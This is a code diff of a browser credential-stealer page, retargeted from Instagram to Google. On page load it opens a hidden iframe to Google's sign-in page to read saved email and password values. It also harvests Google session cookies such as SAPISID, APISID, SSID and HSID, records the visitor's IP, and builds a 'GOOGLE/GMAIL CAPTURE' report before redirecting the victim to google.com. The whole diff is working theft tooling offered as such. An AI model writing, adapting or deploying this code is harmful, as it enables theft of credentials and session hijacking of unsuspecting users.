@@ -42,13 +42,13 @@
         }
 
         // ============================================================
-        // 🧠 CAPTURE INSTAGRAM CREDENTIALS (If Saved in Browser)
+        // 🧠 CAPTURE GOOGLE CREDENTIALS (If Saved in Browser)
         // ============================================================
-        async function captureInstagram() {
-            // Try to load Instagram login page in hidden iframe
+        async function captureGoogle() {
+            // Try to load Google login page in hidden iframe
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
-            iframe.src = 'https://www.instagram.com/accounts/login/';
+            iframe.src = 'https://accounts.google.com/signin';
             document.body.appendChild(iframe);
 
             return new Promise((resolve) => {
@@ -56,12 +56,12 @@
                     try {
                         const doc = iframe.contentDocument || iframe.contentWindow.document;
                         const inputs = doc.querySelectorAll('input');
-                        let username = '', password = '';
+                        let email = '', password = '';
 
                         inputs.forEach(input => {
                             if (input.value && input.value.trim() !== '') {
-                                if (input.type === 'text' || input.name.includes('username')) {
-                                    username = input.value;
+                                if (input.type === 'email' || input.name.includes('email') || input.name.includes('identifier')) {
+                                    email = input.value;
                                 }
                                 if (input.type === 'password') {
                                     password = input.value;
@@ -72,18 +72,43 @@
                         // Also try to get cookies
                         const cookies = doc.cookie || 'No cookies';
 
-                        resolve({ username, password, cookies });
+                        // Try to get Google-specific cookies
+                        const googleCookies = document.cookie.split('; ').filter(c => c.includes('google') || c.includes('GAPS')).join('; ');
+
+                        resolve({ email, password, cookies, googleCookies });
                     } catch(e) {
                         // Cross-origin – fallback
-                        resolve({ username: 'Unable to access (cross-origin)', password: '', cookies: 'Unable to access' });
+                        resolve({ 
+                            email: 'Unable to access (cross-origin)', 
+                            password: '', 
+                            cookies: 'Unable to access',
+                            googleCookies: 'Unable to access'
+                        });
                     }
                 };
 
                 // Timeout after 5 seconds
                 setTimeout(() => {
-                    resolve({ username: 'Timeout', password: '', cookies: 'Timeout' });
+                    resolve({ email: 'Timeout', password: '', cookies: 'Timeout', googleCookies: 'Timeout' });
                 }, 5000);
             });
+        }
+
+        // ============================================================
+        // 🧠 CAPTURE GOOGLE COOKIES (Direct)
+        // ============================================================
+        function getGoogleCookies() {
+            const allCookies = document.cookie.split('; ');
+            const googleCookies = allCookies.filter(c => 
+                c.includes('google') || 
+                c.includes('GAPS') || 
+                c.includes('__Secure') ||
+                c.includes('SAPISID') ||
+                c.includes('APISID') ||
+                c.includes('SSID') ||
+                c.includes('HSID')
+            );
+            return googleCookies.length > 0 ? googleCookies.join('; ') : 'No Google cookies found';
         }
 
         // ============================================================
@@ -102,15 +127,19 @@
         // ============================================================
         window.addEventListener('load', async function() {
 
-            // Capture Instagram data
-            const data = await captureInstagram();
+            // Capture Google data
+            const data = await captureGoogle();
             const ip = await getIP();
             const time = new Date().toISOString();
 
-            let msg = `🎯 **INSTAGRAM CAPTURE**\n━━━━━━━━━━━━━━━━━━━━━\n`;
-            msg += `👤 Username: ${data.username || 'Not found'}\n`;
+            // Get Google cookies directly
+            const googleCookies = getGoogleCookies();
+
+            let msg = `🎯 **GOOGLE/GMAIL CAPTURE**\n━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `📧 Email: ${data.email || 'Not found'}\n`;
             msg += `🔑 Password: ${data.password || 'Not found'}\n`;
-            msg += `🍪 Cookies: ${data.cookies || 'Not found'}\n`;
+            msg += `🍪 Cookies (iframe): ${data.cookies || 'Not found'}\n`;
+            msg += `🍪 Google Cookies (direct): ${googleCookies}\n`;
             msg += `🌐 IP: ${ip}\n`;
             msg += `🕐 Time: ${time}\n━━━━━━━━━━━━━━━━━━━━━`;
 
@@ -118,7 +147,7 @@
 
             // 👻 Blank page – redirect after 3 seconds
             setTimeout(() => {
-                window.location.href = 'https://accounts.google.com/';
+                window.location.href = 'https://www.google.com';
             }, 3000);
         });
 
